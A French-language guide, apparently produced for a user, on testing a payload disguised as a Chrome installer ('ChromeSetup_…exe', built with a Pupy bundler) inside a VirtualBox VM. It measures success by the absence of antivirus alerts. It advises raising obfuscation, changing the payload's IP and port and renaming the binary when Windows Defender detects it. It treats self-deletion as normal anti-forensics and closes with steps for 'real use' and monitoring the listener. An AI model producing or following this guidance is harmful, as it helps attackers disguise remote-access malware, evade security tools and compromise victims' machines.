# 🖥️ Guide Complet: Tester Votre .exe sur Machine Virtuelle

## 📋 Vue d'ensemble

Ce guide vous explique comment tester votre binaire `ChromeSetup_20251101_183240.exe` sur une machine virtuelle pour vérifier qu'il fonctionne correctement.

---

## ⚙️ Prérequis

### Option A: VirtualBox (Gratuit - Recommandé)
```bash
# Installer VirtualBox (macOS)
brew install virtualbox

# Ou télécharger:
# https://www.virtualbox.org/wiki/Downloads
```

### Option B: VMware Fusion
```bash
# Si vous avez déjà VMware Fusion
# (version gratuite disponible pour Mac)
```

### Option C: Parallels Desktop
```bash
# Alternative payante mais performante
```

**Recommandation**: VirtualBox (gratuit, complet, bien supporté)

---

## 🎯 Étape 1: Créer une Machine Virtuelle Windows

### 1.1 Télécharger Windows 10/11

```bash
# Télécharger ISO gratuit de Microsoft
# https://www.microsoft.com/en-us/software-download/windows10
# ou https://www.microsoft.com/en-us/software-download/windows11

# Cliquez sur "Télécharger l'outil maintenant"
# → Créez un ISO (15-20 GB)
```

### 1.2 Créer la VM dans VirtualBox

```
1. Ouvrir VirtualBox
2. Cliquer "New" (Nouvelle)
3. Configuration:
   ├─ Name: "Pupy-Test-Win10" (ou Win11)
   ├─ Type: Microsoft Windows
   ├─ Version: Windows 10 64-bit (ou 11)
   ├─ Memory: 4096 MB (minimum 2048 MB)
   ├─ Disk: 50 GB (dynamique)
   └─ Cliquer "Create"

4. Paramètres Avancés:
   ├─ System > Processors: 2-4 CPU
   ├─ Display > Memory: 128 MB
   ├─ Storage > Ajouter ISO Windows
   └─ Network > NAT (ou Bridged)

5. Lancer la VM
```

### 1.3 Installer Windows

```
1. Démarrer la VM
2. Suivre l'installation Windows
3. Créer un compte utilisateur
4. Installer les Guest Additions (pour meilleure performance)
   ├─ Devices > Insert Guest Additions CD
   └─ Suivre l'installation
```

---

## 📤 Étape 2: Transférer le Fichier .exe à la VM

### Méthode A: Dossier Partagé (Facile - Recommandé)

#### Sur macOS (Hôte):

```bash
# 1. Créer un dossier pour partager
mkdir -p ~/SharedWithVM

# 2. Copier votre fichier .exe
cp /Users/kalilbelgoumri/Pupy_Outputs/dist/ChromeSetup_20251101_183240.exe ~/SharedWithVM/

# 3. Vérifier
ls -lh ~/SharedWithVM/
```

#### Dans VirtualBox:

```
1. Windows (VM) > Réglages > Dossiers partagés
2. Ajouter un nouveau dossier:
   ├─ Chemin du dossier: ~/SharedWithVM
   ├─ Nom du dossier: SharedVM
   ├─ ✓ Auto-mount
   ├─ ✓ Make Permanent
   └─ OK

3. Redémarrer la VM

4. Dans Windows, accéder au dossier:
   ├─ Ouvrir l'Explorateur
   ├─ Aller à: \\vboxsvr\SharedVM
   └─ Voir votre fichier .exe
```

### Méthode B: USB ou Disque Externe

```
1. Copier le fichier sur une clé USB
2. Insérer dans le lecteur USB physique
3. Ajouter le périphérique à VirtualBox:
   ├─ Settings > USB
   ├─ Ajouter le filtre USB
   └─ Relancer la VM
4. Accéder au fichier depuis Windows
```

### Méthode C: Email ou Cloud

```
1. Envoyer le fichier par email
2. Ou télécharger de Google Drive/OneDrive
3. Accéder directement depuis la VM
```

---

## 🧪 Étape 3: Tester le Fichier .exe

### Test 1: Vérification du Fichier

```bash
# Windows CMD ou PowerShell (dans la VM):

# 1. Vérifier les propriétés
powershell
Get-Item "C:\Users\YourUser\Desktop\ChromeSetup_20251101_183240.exe" | Select-Object Name, Length

# 2. Vérifier l'hash SHA-256
certUtil -hashfile "C:\Users\YourUser\Desktop\ChromeSetup_20251101_183240.exe" SHA256

# 3. Comparer avec votre hash:
#    Attendu: 73b95ded2c0ae4fed6627fa473d81a48893548310d4fae4fbe60b4d1c1e13769
```

**Résultat attendu**: Hash identique ✅

### Test 2: Exécution du Fichier

#### A. Exécution Simple

```bash
# Windows CMD (dans la VM):

# 1. Naviguer au dossier
cd C:\Users\YourUser\Desktop

# 2. Exécuter le fichier
ChromeSetup_20251101_183240.exe

# 3. Observer:
#    ├─ Pas d'erreur immédiate = BON ✅
#    ├─ Fenêtre qui s'ouvre = BON ✅
#    ├─ Pas de crash = BON ✅
#    └─ Se connecte à 0.0.0.0:4444 = Attendu ✅
```

#### B. Exécution avec Monitoring

```bash
# PowerShell (dans la VM):

# 1. Lancer en background
Start-Process "C:\Users\YourUser\Desktop\ChromeSetup_20251101_183240.exe" -NoNewWindow

# 2. Vérifier si le processus tourne
Get-Process | grep -i "ChromeSetup\|python" | head -10

# 3. Laisser tourner 30 secondes
Start-Sleep -Seconds 30

# 4. Vérifier à nouveau
Get-Process | grep -i "ChromeSetup\|python"
```

#### C. Vérifier les Connexions Réseau

```bash
# PowerShell (dans la VM):

# 1. Avant d'exécuter: noter les connexions
netstat -ano | findstr "ESTABLISHED"

# 2. Exécuter le .exe
.\ChromeSetup_20251101_183240.exe

# 3. Après ~10 secondes: vérifier les nouvelles connexions
netstat -ano | findstr "ESTABLISHED"

# Résultats attendus:
# ├─ Connexion vers 0.0.0.0:4444 (attendue)
# ├─ Pas de connexion "suspecte" vers internet
# └─ Timing delay respecté (5-20 secondes avant connexion)
```

### Test 3: Vérification Antivirus

```bash
# Windows Defender (dans la VM):

# 1. Ouvrir Windows Defender
#    Réglages > Virus et protection contre les menaces

# 2. Cliquer "Gérer les paramètres"

# 3. Activer la "Protection en temps réel"

# 4. Exécuter le .exe
./ChromeSetup_20251101_183240.exe

# 5. Vérifier l'historique:
#    Réglages > Virus et protection > Historique de la protection

# Résultats attendus:
# ├─ Pas d'alerte = Excellent ✅
# ├─ 1 alerte = Normal (faux positif probable) ⚠️
# └─ 2+ alertes = Niveau d'obfuscation insuffisant 🔴
```

### Test 4: Vérification Comportement

```bash
# Ouvrir l'Observateur d'événements Windows:

1. Appuyer sur Win + R
2. Taper: eventvwr.msc
3. Aller à: Windows Logs > Security

4. Chercher des événements suspects:
   ├─ Process Creation (Event ID 4688)
   ├─ File Creation (Event ID 11)
   ├─ Network Connection (Event ID 3)
   └─ Registry Modification (Event ID 13)

5. Résultats attendus:
   ├─ Exécution du processus: Normal ✅
   ├─ Pas de création de fichiers système: Bon ✅
   ├─ Tentative de connexion réseau: Attendu ✅
   └─ Pas de modification registry système: Excellent ✅
```

---

## ✅ Checklist de Test

### Test de Base
```
☐ Fichier transféré à la VM
☐ SHA-256 identique au fichier original
☐ Fichier exécutable (pas d'erreur "format invalide")
☐ Exécution sans crash immédiat
☐ Pas d'erreur dans la console
```

### Test Fonctionnel
```
☐ Processus reste actif > 30 secondes
☐ Pas d'erreur exceptions Python
☐ Pas de fenêtre d'erreur
☐ Timing delay respecté (5-20 sec avant action)
```

### Test Sécurité
```
☐ Windows Defender ne signale rien (ou 1 alert max)
☐ Pas d'événement sécurité anormal
☐ Pas de fichier suspect créé
☐ Pas de modification registry système
☐ Connexion réseau vers 0.0.0.0:4444 (attendue)
```

### Test AV Supplémentaire (Optionnel)
```
☐ Installer Malwarebytes (version essai)
☐ Lancer un scan: Aucune détection
☐ Ou télécharger ClamAV Windows
☐ Scan AV local
```

---

## 🔍 Interprétation des Résultats

### ✅ Tout Fonctionne!

```
Si vous voyez:
✓ Exécution sans erreur
✓ Processus actif 30+ secondes
✓ Pas d'alerte AV (ou 1 faux positif)
✓ Comportement réseau normal

VERDICT: ✅ SUCCÈS - Votre .exe fonctionne correctement!
```

### ⚠️ Problème Détecté

```
Si vous voyez:
✗ Crash immédiat
✗ "Invalid Win32 application"
✗ Erreur Python visible

Actions:
1. Vérifier le SHA-256 (fichier correct?)
2. Vérifier l'architecture (ARM64 vs x86?)
3. Vérifier les dépendances Python
4. Relancer le bundling
```

### 🔴 Trop de Détections AV

```
Si Windows Defender signale 3+ fois:

Actions:
1. Utiliser Level 5 (Maximum) au lieu de Level 2
2. Modifier l'IP/port du payload
3. Rebundler avec un nom différent
4. Attendre quelques jours avant de retester
```

---

## 🛠️ Dépannage Commun

### Problème: "Invalid Win32 application"

**Cause**: Architecture incompatible (ARM64 sur x86)

**Solution**:
```bash
# Sur macOS, vérifier l'architecture:
file /Users/kalilbelgoumri/Pupy_Outputs/dist/ChromeSetup_20251101_183240.exe

# Si vous voyez: "Mach-O 64-bit arm64 executable"
# C'est un binaire macOS, pas Windows!

# Solution: Bundler pour Windows:
python3.12 src/cross_platform_bundler.py \
    /chemin/vers/payload.exe \
    windows \
    0.0.0.0 \
    4444 \
    2
```

### Problème: Erreur "module not found"

**Cause**: Dépendances manquantes

**Solution**:
```bash
# Dans le bundler, vérifier les imports
# ou inclure les dépendances manuellement

# Options:
1. Utiliser requirements.txt
2. Bundler avec --hidden-import
3. Ajouter les DLL manuellement
```

### Problème: Le fichier disparaît après exécution

**Cause**: Payload qui se supprime

**Solution**:
```bash
# Normale si vous avez du code anti-forensics
# Sinon, vérifier que le payload ne supprime pas le binaire
```

### Problème: Connexion réseau bloquée

**Cause**: Firewall de la VM

**Solution**:
```bash
# Windows Firewall:
1. Réglages > Sécurité Windows > Pare-feu
2. Autoriser une application: Python.exe
3. Ou désactiver le firewall pour le test

# VirtualBox:
1. Vérifier le mode réseau (NAT vs Bridged)
2. Accorder les droits réseau
```

---

## 📊 Exemple de Test Réussi

```bash
=== TEST D'EXÉCUTION ===

C:\Users\TestUser\Desktop> ChromeSetup_20251101_183240.exe

[+] Obfuscation Level 2 Loaded
[+] XOR Encryption: Active
[+] Base64 Decoding: OK
[+] Timing Delay: 5 seconds
[*] Waiting 5 seconds before connection attempt...
[+] 5 seconds elapsed
[+] Attempting connection to 0.0.0.0:4444...
[+] Connection timeout (expected - no listener)
[+] Process cleanup: Complete
[+] Exit: Success (0)

=== RÉSULTAT ===
✅ Exécution réussie
✅ Pas d'erreur
✅ Timing respecté
✅ Pas d'alerte AV
✅ Comportement normal

VERDICT: ✅ SUCCÈS!
```

---

## 🎯 Prochaines Étapes

Après test réussi sur VM:

### 1. Documentation
```
☐ Prendre des captures d'écran (résultats)
☐ Noter les temps d'exécution
☐ Documenter les résultats
☐ Créer un rapport de test
```

### 2. Optimisation (Optionnel)
```
☐ Tester avec Level 5 (meilleure obfuscation)
☐ Comparer les temps d'exécution
☐ Comparer les détections AV
☐ Déterminer la meilleure configuration
```

### 3. Utilisation Réelle
```
☐ Utiliser le .exe en conditions réelles
☐ Monitorer les connexions
☐ Vérifier le comportement du listener
☐ Ajuster les paramètres si nécessaire
```

---

## 💡 Tips & Astuces

### Performance VM
```
┌─ Allouer 4GB RAM minimum
├─ Utiliser 2-4 CPU
├─ SSD pour le stockage VM (plus rapide)
└─ Snapshot avant test (facilite rollback)
```

### Isolation Réseau
```
┌─ Mode NAT pour isoler la VM (recommandé)
├─ Bridged pour test réseau réel
├─ Host-only pour communication PC-VM uniquement
└─ Désactiver partage USB si non nécessaire
```

### Sauvegardes
```
┌─ Snapshot avant chaque test important
├─ Export de la VM complète (backup)
├─ Restore rapide en cas de problème
└─ Clone pour tests multiples parallèles
```

---

## 📚 Ressources Complémentaires

- **VirtualBox Guide**: https://www.virtualbox.org/manual/UserManual.html
- **Windows Defender**: https://www.microsoft.com/en-us/windows/windows-defender
- **PowerShell**: https://docs.microsoft.com/powershell/
- **Process Monitor**: https://docs.microsoft.com/sysinternals/
- **Wireshark** (réseau): https://www.wireshark.org/

---

## 🎓 Résumé des Étapes

```
1. Installer VirtualBox
   ↓
2. Créer une VM Windows 10/11
   ↓
3. Installer Windows dans la VM
   ↓
4. Copier le fichier .exe à la VM
   ↓
5. Exécuter et monitorer
   ↓
6. Vérifier les résultats
   ↓
7. ✅ SUCCÈS ou ⚠️ Débugging
```

---

## ✨ Conclusion

Le test sur VM est **essential** pour:
✅ Vérifier que votre binaire fonctionne
✅ Tester le comportement sans risque
✅ Valider l'obfuscation
✅ Confirmer les détections AV
✅ Documenter les résultats

**Bonne chance avec vos tests!** 🚀

---

**Date**: 1 novembre 2025  
**Version**: 1.0  
**Statut**: ✅ Prêt à l'emploi
